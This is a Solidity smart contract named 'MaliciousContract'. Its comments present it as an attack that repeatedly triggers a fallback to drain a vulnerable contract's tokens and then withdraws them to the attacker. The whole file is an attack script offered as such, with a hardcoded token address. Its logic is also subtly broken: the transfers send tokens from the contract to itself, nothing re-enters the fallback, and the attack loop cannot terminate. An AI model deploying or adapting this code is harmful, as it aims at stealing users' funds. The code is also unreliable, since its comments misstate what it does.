pragma solidity ^0.8.0;

interface Token {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousContract {
    uint256 public amountOwed;
    address public tokenContractAddress = 0x6276dea68C8A9bB688813687605663E7a28eb48c;
    Token public tokenContract;

    constructor() public payable {
        tokenContract = Token(tokenContractAddress);
        amountOwed = msg.value;
    }

    fallback() external payable {
        if (amountOwed <= address(this).balance) {
            // transfer tokens from vulnerable contract to this contract
            tokenContract.transfer(address(this), amountOwed);
            amountOwed = 0;
        }
    }

    function attack() public {
        // repeatedly call fallback function to drain vulnerable contract's tokens
        while (amountOwed > 0) {
            tokenContract.transfer(address(this), amountOwed);
        }
    }

    function getBalance() public view returns (uint256) {
        // get the balance of this contract's address for the vulnerable token
        return tokenContract.balanceOf(address(this));
    }

    function withdrawTokens() public {
        // withdraw tokens from this contract to the attacker's address
        uint256 balance = tokenContract.balanceOf(address(this));
        tokenContract.transfer(msg.sender, balance);
    }
}